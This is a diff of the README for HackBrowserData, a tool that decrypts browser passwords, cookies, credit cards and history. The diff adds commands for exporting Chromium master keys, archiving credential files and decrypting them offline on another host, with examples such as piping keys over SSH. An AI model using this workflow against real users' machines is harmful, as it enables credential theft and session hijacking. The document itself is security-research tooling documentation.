@@ -8,6 +8,8 @@
 
 `HackBrowserData` is a command-line tool for decrypting and exporting browser data (passwords, history, cookies, bookmarks, credit cards, download history, localStorage, sessionStorage and extensions) from the browser. It supports the most popular Chromium-based browsers and Firefox on Windows, macOS and Linux, plus Safari on macOS.
 
+It can also decrypt data **across machines and operating systems**: export the master keys on the origin host, then decrypt a copy of the data offline on any other host — even for a browser that the analyst host's OS cannot run (see [Cross-host decryption](#cross-host-decryption)).
+
 > Disclaimer: This tool is only intended for security research. Users are responsible for all legal and related liabilities resulting from the use of this tool. The original author does not assume any legal responsibility.
 
 ## Supported Data Categories
@@ -42,19 +44,21 @@
 | Vivaldi        |    ✅    |   ✅   |   ✅   |
 | Yandex         |    ✅    |   ✅   |   -   |
 | CocCoc         |   ✅²   |   ✅   |   -   |
-| Arc            |    -    |   ✅   |   -   |
-| DuckDuckGo     |    ✅    |   -   |   -   |
-| QQ             |    ✅    |   -   |   -   |
-| 360 ChromeX    |    ✅    |   -   |   -   |
-| 360 Chrome     |    ✅    |   -   |   -   |
-| DC Browser     |    ✅    |   -   |   -   |
-| Sogou Explorer |    ✅    |   -   |   -   |
+| Arc            |    ✅    |   ✅   |   -   |
+| DuckDuckGo³    |    ✅    |   -   |   -   |
+| QQ³            |    ✅    |   -   |   -   |
+| 360 ChromeX³   |    ✅    |   -   |   -   |
+| 360 Chrome³    |    ✅    |   -   |   -   |
+| DC Browser³    |    ✅    |   -   |   -   |
+| Sogou Explorer³|    ✅    |   -   |   -   |
 | Firefox        |    ✅    |   ✅   |   ✅   |
 | Safari¹        |    -    |   ✅   |   -   |
 
 > ¹ Safari requires Full Disk Access; enable it in System Settings → Privacy & Security → Full Disk Access if extraction returns empty results.
 >
 > ² On Windows, decrypting Chromium 127+ cookies (Chrome / Chrome Beta / Edge / Brave / CocCoc) requires the App-Bound Encryption payload built via `make build-windows` — see [Building from source](#building-from-source) below.
+>
+> ³ These browsers ship only on Windows, but their data is **decryptable on any OS**: pull the files with `archive`, export the keys with `dumpkeys`, then decrypt on macOS or Linux with `restore` — see [Cross-host decryption](#cross-host-decryption).
 
 ## Getting Started
 
@@ -117,16 +121,19 @@ Usage:
   hack-browser-data [command]
 
 Available Commands:
+  archive     Pack decryption-relevant profile files into a zip for cross-host restore
   dump        Extract and decrypt browser data (default command)
+  dumpkeys    Export Chromium master keys as JSON for cross-host decryption
   help        Help about any command
   list        List detected browsers and profiles
+  restore     Decrypt copied profile data using exported master keys
   version     Print version information
 
 Flags:
   -b, --browser string        target browser: all|chrome|firefox|edge|... (default "all")
   -c, --category string       data categories (comma-separated): all|password,cookie,... (default "all")
   -d, --dir string            output directory (default "results")
-  -f, --format string         output format: csv|json|cookie-editor (default "csv")
+  -f, --format string         output format: csv|json|cookie-editor (default "json")
   -h, --help                  help for hack-browser-data
       --keychain-pw string    macOS keychain password
   -p, --profile-path string   custom profile dir path, get with chrome://version
@@ -144,11 +151,87 @@ Running `hack-browser-data` without a subcommand defaults to `dump`.
 |------------------|-------|-----------|--------------------------------------------------------------------------------------------------------------------------------------------|
 | `--browser`      | `-b`  | `all`     | Target browser (all\|chrome\|firefox\|edge\|...)                                                                                           |
 | `--category`     | `-c`  | `all`     | Data categories, comma-separated (all\|password\|cookie\|bookmark\|history\|download\|creditcard\|extension\|localstorage\|sessionstorage) |
-| `--format`       | `-f`  | `csv`     | Output format (csv\|json\|cookie-editor)                                                                                                   |
+| `--format`       | `-f`  | `json`    | Output format (csv\|json\|cookie-editor)                                                                                                   |
 | `--dir`          | `-d`  | `results` | Output directory                                                                                                                           |
 | `--profile-path` | `-p`  |           | Custom profile dir path, get with chrome://version                                                                                         |
 | `--keychain-pw`  |       |           | macOS keychain password                                                                                                                    |
 | `--zip`          |       | `false`   | Compress output to zip                                                                                                                     |
+
+> `--format cookie-editor` writes **only cookies**, as a JSON array matching the Cookie-Editor browser extension's import format; non-cookie categories are skipped.
+
+### Cross-host decryption
+
+Decrypt browser data on an **analyst host** that was collected on a different **origin host** — including a browser whose engine the analyst's OS cannot even install (e.g. decrypt Sogou or QQ Browser data on macOS). Nothing platform-bound (DPAPI, macOS Keychain, Chrome App-Bound Encryption) has to leave the origin: the master keys are exported once, and decryption then runs entirely offline from a copy of the data.
+
+The workflow uses three commands and two transportable artifacts:
+
+| Step | Host | Command | Produces |
+|------|------|---------|----------|
+| 1 | origin | `dumpkeys` | `keys.json` — portable master keys |
+| 2 | origin | `archive` | `browser-data.zip` — only the files needed to decrypt |
+| 3 | analyst | `restore` | decrypted output (csv / json / cookie-editor) |
+
+```bash
+# On the origin host (any OS) — export the keys and pack the data
+hack-browser-data dumpkeys -o keys.json
+hack-browser-data archive  -o browser-data.zip
+
+# Copy keys.json + browser-data.zip to the analyst host, then decrypt offline
+hack-browser-data restore --keys keys.json --data-zip browser-data.zip
+```
+
+> `keys.json` contains plaintext master keys — treat it as a secret. `dumpkeys -o` writes it with `0600` permissions; prefer streaming it over a secure channel instead of leaving it on disk.
+
+#### `dumpkeys` - Export master keys for cross-host decryption
+
+Derives each Chromium installation's master keys on the origin host and writes them as JSON (Firefox / Safari have no portable key and are skipped). Defaults to stdout so it can be piped over SSH.
+
+| Flag            | Short | Default  | Description                                     |
+|-----------------|-------|----------|-------------------------------------------------|
+| `--browser`     | `-b`  | `all`    | Target browser (all\|chrome\|edge\|...)         |
+| `--output`      | `-o`  | *stdout* | Output file (written `0600`); stdout if omitted |
+| `--keychain-pw` |       |          | macOS keychain password                         |
+
+#### `archive` - Pack decryption-relevant files for transport
+
+Collects only the files a restore actually needs (cookies, login data, history, …) through the same locked-file bypass used for extraction, so live SQLite files are read safely on Windows. The zip is laid out as `<browser-key>/<User Data layout>`, so one archive can carry several browsers and restore stays unambiguous. Entry names are always forward-slash, so a Windows-produced archive restores on macOS / Linux.
+
+| Flag         | Short | Default            | Description                             |
+|--------------|-------|--------------------|-----------------------------------------|
+| `--browser`  | `-b`  | `all`              | Target browser (all\|chrome\|edge\|...) |
+| `--category` | `-c`  | `all`              | Data categories, comma-separated        |
+| `--output`   | `-o`  | `browser-data.zip` | Output archive path                     |
+
+#### `restore` - Decrypt copied data with exported keys
+
+Rebuilds each Chromium engine straight from `keys.json` and decrypts the supplied data — it never consults the analyst's local browser table, so **the browsers you can restore are exactly the vaults in your `keys.json`**. Supply the data one of two ways (exactly one is required):
+
+- `--data-zip` — a zip produced by `archive`; extracted to a temp dir and removed afterward.
+- `--data-dir` — a directory. Either the `archive` layout (`<browser-key>/...`, several browsers at once), or one browser's hand-copied `User Data` root, which is unambiguous only for a single browser — so pair it with `-b`.
+
+`-b` is an **optional filter** over the dump's vaults, not a required selector.
+
+| Flag         | Short | Default    | Description                                                |
+|--------------|-------|------------|------------------------------------------------------------|
+| `--keys`     |       | *required* | Keys file from `dumpkeys` (use `-` for stdin)              |
+| `--data-zip` |       |            | Zip from `archive` (mutually exclusive with `--data-dir`)  |
+| `--data-dir` |       |            | Copied data dir (mutually exclusive with `--data-zip`)     |
+| `--browser`  | `-b`  |            | Restore only this browser; must match a vault in `--keys`  |
+| `--category` | `-c`  | `all`      | Data categories, comma-separated                           |
+| `--format`   | `-f`  | `json`     | Output format (csv\|json\|cookie-editor)                   |
+| `--dir`      | `-d`  | `results`  | Output directory                                           |
+| `--zip`      |       | `false`    | Compress output to zip                                     |
+
+#### Cross-host examples
+
+```bash
+# Stream keys over SSH (no keys.json on disk), data copied separately
+ssh origin "hack-browser-data dumpkeys" | \
+  hack-browser-data restore --keys - --data-zip browser-data.zip
+
+# Restore one browser from a hand-copied User Data folder (no archive)
+hack-browser-data restore --keys keys.json --data-dir ./chrome-userdata -b chrome
+```
 
 ### `list` - List detected browsers and profiles
 
@@ -177,8 +260,8 @@ hack-browser-data
 # Extract specific browser and categories
 hack-browser-data dump -b chrome -c password,cookie
 
-# Export in JSON format to a custom directory
-hack-browser-data dump -b chrome -f json -d output
+# Export in CSV format to a custom directory (JSON is the default)
+hack-browser-data dump -b chrome -f csv -d output
 
 # Export cookies in CookieEditor format
 hack-browser-data dump -f cookie-editor
